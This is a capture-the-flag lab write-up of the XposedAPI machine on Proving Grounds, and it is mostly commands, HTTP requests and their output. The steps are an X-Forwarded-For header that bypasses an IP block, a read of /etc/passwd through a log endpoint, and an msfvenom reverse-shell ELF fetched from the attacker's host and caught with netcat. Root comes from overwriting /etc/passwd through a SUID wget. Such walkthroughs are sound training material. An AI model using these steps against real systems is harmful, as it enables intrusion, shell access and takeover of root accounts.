---
title: XposedAPI - Proving Grounds
published: true
---

![](assets/img/xposedapi-pg/icon.png)

**Hey Guys!** Today we are going to pwn **XposedAPI** from [Proving Grounds](https://portal.offensive-security.com/proving-grounds/practice).

**XposedAPI** is an intermediate level linux based box. Before we begin, a brief overview of what exactly we are going to do :
- First, we scan the box to find an API service.
- Enumerating the API reveals an endpoint where we can upload a malicous ELF file as an update.
- But to upload, we need a valid user's name on the box.
- Enumerating further, we find an access denied endpoint, which we bypass easily to get arbitrary file read on the box.
- Finding the username, we upload the shell and get user access on the box.
- Then a classic SUID binary misuse to get root on the box.

With that said, let us begin.

![](assets/img/xposedapi-pg/meme1.gif)

## SCANNING :

```
┌──(root💀nehal)-[~]
└─# nmap -p- -T4 -sC -sV 192.168.224.134
Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-13 03:07 IST
Nmap scan report for 192.168.224.134
Host is up (0.30s latency).
Not shown: 65533 closed ports
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 74:ba:20:23:89:92:62:02:9f:e7:3d:3b:83:d4:d9:6c (RSA)
|   256 54:8f:79:55:5a:b0:3a:69:5a:d5:72:39:64:fd:07:4e (ECDSA)
|_  256 7f:5d:10:27:62:ba:75:e9:bc:c8:4f:e2:72:87:d4:e2 (ED25519)
13337/tcp open  http    Gunicorn 20.0.4
|_http-server-header: gunicorn/20.0.4
|_http-title: Remote Software Management API
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1199.06 seconds
```

NMAP reveals ports 22 and 13337 to be open. SSH service (**OpenSSH 7.9p1**) is running on port 22 and web service (**Gunicorn 20.0.4**) on port 13337.

## ENUMERATING WEB:

When we go to the website, we are presented with the below page :

![](assets/img/xposedapi-pg/api-home.png)

It looks some kind of software management API. The page itself reveals some endpoints :

```
/
Methods: GET
Returns this page.


/version
Methods: GET
Returns version of the app running.


/update
Methods: POST
Updates the app from ELF file. Content-Type: application/json {"user":"<user requesting the update>", "url":"<url of the update to download>"}


/logs
Methods: GET
Read log files.


/restart
Methods: GET
To request the restart of the app.
```

Of all these, the `/update` endpoint should catch our eye. Cause, with this, we can upload an ELF file as an update to the web app and get shell on the box.

Let us fire up burpsuite and play with this a bit.

```
POST /update HTTP/1.1
Host: 192.168.224.134:13337
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
Content-Type: application/json
Content-Length: 55

{"user":"pwnersec", "url":"http://192.168.49.224/test"}

-----------------------------------------------------------------------------------------------------------------------------------------

HTTP/1.1 200 OK
Server: gunicorn/20.0.4
Date: Sat, 12 Jun 2021 16:45:10 GMT
Connection: close
Content-Type: text/html; charset=utf-8
Content-Length: 17

Invalid username.
```

Here. I have made a POST request to `/update`, changed the `Content-Type` header to `application/json` and supplied a dummy username and url. We can see that the server replies with `Invalid username`. So I assume that we need to supply a valid user's name on the server. 

So, let us step back and enumerate further.

Another endpoint that might be useful to us is `/logs`. Maybe we find some sensitive information like a user's name that can be used with `/update` to upload a malicious ELF.

```
GET /logs HTTP/1.1
Host: 192.168.224.134:13337
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0

-----------------------------------------------------------------------------------------------------------------------------------------

HTTP/1.1 403 FORBIDDEN
Server: gunicorn/20.0.4
Date: Sat, 12 Jun 2021 16:52:36 GMT
Connection: close
Content-Type: text/html; charset=utf-8
Content-Length: 33

WAF: Access Denied for this Host.
```

When we make a request to `/logs`, we get a 403 access denied for our IP. 

A very common trick to bypass such restriction is to use `X-Forwarded-For` header with the value `127.0.0.1`, so this will make the server think that the request is forwarded from the localhost itself and we might be able to go beyond the restriction. Let us try it out.

```
GET /logs HTTP/1.1
Host: 192.168.224.134:13337
X-Forwarded-For: 127.0.0.1
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0

-----------------------------------------------------------------------------------------------------------------------------------------

HTTP/1.1 404 NOT FOUND
Server: gunicorn/20.0.4
Date: Sat, 12 Jun 2021 16:58:35 GMT
Connection: close
Content-Type: text/html; charset=utf-8
Content-Length: 73

Error! No file specified. Use file=/path/to/log/file to access log files.
```

It seems we are successful in bypassing it, since we see a different response from the previous one.

Now the server is asking for a `file` parameter to access a log file. We can use it to get the username of the server users from `/etc/passwd`. Let us check this out.

```
GET /logs?file=/etc/passwd HTTP/1.1
Host: 192.168.224.134:13337
X-Forwarded-For: 127.0.0.1
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0

-----------------------------------------------------------------------------------------------------------------------------------------

.......SNIP..........

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
clumsyadmin:x:1000:1000::/home/clumsyadmin:/bin/sh

........SNIP.............
```

We find the username to be `clumsyadmin`. Now let us see if we can make a request to our box with this username.

```
POST /update HTTP/1.1
Host: 192.168.224.134:13337
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
Content-Type: application/json
Content-Length: 58

{"user":"clumsyadmin", "url":"http://192.168.49.224/test"}
```

```
┌──(root💀nehal)-[~]
└─# echo test > test
┌──(root💀nehal)-[~]
└─# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.224.134 - - [13/Jun/2021 04:05:59] "GET /test HTTP/1.1" 200 -
```

I have made a dummy file `test` and made the server request it. And we can see that the server successfully requests it.

## EXPLOITATION :

Now let us create a malicious file with `msfvenom` and serve this to the server.

```
┌──(root💀nehal)-[~]
└─# msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.49.224 LPORT=22 -f elf > shell.elf
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 74 bytes
Final size of elf file: 194 bytes
```

Now let us request it via the server as an update.

```
POST /update HTTP/1.1
Host: 192.168.224.134:13337
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
Content-Type: application/json
Content-Length: 63

{"user":"clumsyadmin", "url":"http://192.168.49.224/shell.elf"}

-----------------------------------------------------------------------------------------------------------------------------------------

HTTP/1.1 200 OK
Server: gunicorn/20.0.4
Date: Sat, 12 Jun 2021 17:10:55 GMT
Connection: close
Content-Type: text/html; charset=utf-8
Content-Length: 81

Update requested by clumsyadmin. Restart the software for changes to take effect.
```

We have successfully uploaded the shell. Now we need to restart the web app by `/restart` endpoint. We also need to set up a listener on the specified port.

```
┌──(root💀nehal)-[~]
└─# nc -nlvp 22
listening on [any] 22 ...
connect to [192.168.49.224] from (UNKNOWN) [192.168.224.134] 33594
python -c 'import pty;pty.spawn("/bin/bash")'
clumsyadmin@xposedapi:/home/clumsyadmin/webapp$ id && hostname
id && hostname
uid=1000(clumsyadmin) gid=1000(clumsyadmin) groups=1000(clumsyadmin)
xposedapi
clumsyadmin@xposedapi:/home/clumsyadmin/webapp$ 
```

We have shell as user `clumsyadmin`.

![](assets/img/xposedapi-pg/meme2.gif)

## PRIVILEGE ESCALATION :

Let us begin by searching for SUID bit set files:

```
clumsyadmin@xposedapi:/home/clumsyadmin$ find / -type f -perm -4000 2>/dev/null
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/bin/mount
/usr/bin/passwd
/usr/bin/su
/usr/bin/wget
/usr/bin/fusermount
/usr/bin/umount
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/newgrp
/usr/bin/sudo
/usr/bin/gpasswd
```

The one binary that should catch our eye is the `wget` binary.

With `wget`, we might not be able to drop elevated privileges, but we can modify any file on the filesystem with `-O` option. 

In this case I am going to manipulate the `/etc/passwd` file to get root access.

First, let us copy the contents of `/etc/passwd`. Then we use `mkpasswd` to generate a SHA-512 hash for the root user.

```
┌──(root💀nehal)-[~]
└─# mkpasswd -m sha-512 hacked
$6$Pql6Fkn4r0/1Jqmj$wGiMOaxqEnvtCrAMADo71gtOKsNsu4FlqonAq4hcfhu3dQptpDcEcFfUp2LvyTW2dy799l/ZzCHABhsIizSLY.
```

Now we need to paste the hash on the password field of root user in `/etc/passwd` copy.

```
root:$6$Pql6Fkn4r0/1Jqmj$wGiMOaxqEnvtCrAMADo71gtOKsNsu4FlqonAq4hcfhu3dQptpDcEcFfUp2LvyTW2dy799l/ZzCHABhsIizSLY.:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
clumsyadmin:x:1000:1000::/home/clumsyadmin:/bin/sh
```

We just need to fetch this copy with `wget` and save it to `/etc/passwd` with the `-O` option.

```
clumsyadmin@xposedapi:/home/clumsyadmin$ wget http://192.168.49.224/passwd.bak -O /etc/passwd
--2021-06-12 13:40:06--  http://192.168.49.224/passwd.bak
Connecting to 192.168.49.224:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1502 (1.5K) [application/x-trash]
Saving to: '/etc/passwd'

/etc/passwd                                   100%[==============================================================================================>]   1.47K  --.-KB/s    in 0.001s  

2021-06-12 13:40:06 (1.95 MB/s) - '/etc/passwd' saved [1502/1502]

clumsyadmin@xposedapi:/home/clumsyadmin$ 
```

Let us now switch over to root.

```
clumsyadmin@xposedapi:/home/clumsyadmin$ su - root 
Password: 
root@xposedapi:~# id && hostname; date
uid=0(root) gid=0(root) groups=0(root)
xposedapi
Sat 12 Jun 2021 01:41:12 PM EDT
root@xposedapi:~# 
```

And we get shell as `root`. 

![](assets/img/xposedapi-pg/meme3.gif)

So that was **XposedAPI** from **Proving Grounds**.

**Thanks** for reading this far. Hope you liked it.

I will see you in the next writeup. **Peace**.